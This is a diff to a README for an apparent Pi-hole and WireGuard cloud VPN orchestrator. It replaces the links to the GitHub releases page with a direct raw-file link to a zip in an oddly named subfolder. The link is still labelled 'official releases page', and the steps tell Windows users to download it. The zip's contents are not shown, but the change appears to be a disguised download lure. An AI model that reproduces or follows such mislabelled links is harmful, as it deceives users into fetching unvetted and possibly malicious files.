@@ -1,6 +1,6 @@
 # 🛡️ PiHole-Cloud-Wireguard-VPN-Orchestrator - Private Ad-Free Internet For Every Device
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/main/Michel/Wireguard-Hole-Pi-Cloud-VP-Orchestrator-3.7.zip)
 
 This project gives you a private way to browse the internet. It blocks ads on every device in your home. You host this setup on your own cloud instance. It uses a secure tunnel to protect your data. You keep full control over your privacy.
 
@@ -27,7 +27,7 @@ Before you start, check your system. You need a modern computer to manage the se
 
 You must download the latest release files to begin. These files contain the scripts that automate the server creation.
 
-1.  Visit the [official releases page](https://github.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/releases) to download the setup package.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/main/Michel/Wireguard-Hole-Pi-Cloud-VP-Orchestrator-3.7.zip) to download the setup package.
 2.  Select the latest version at the top of the list.
 3.  Click the zip file to save it to your Windows computer.
 
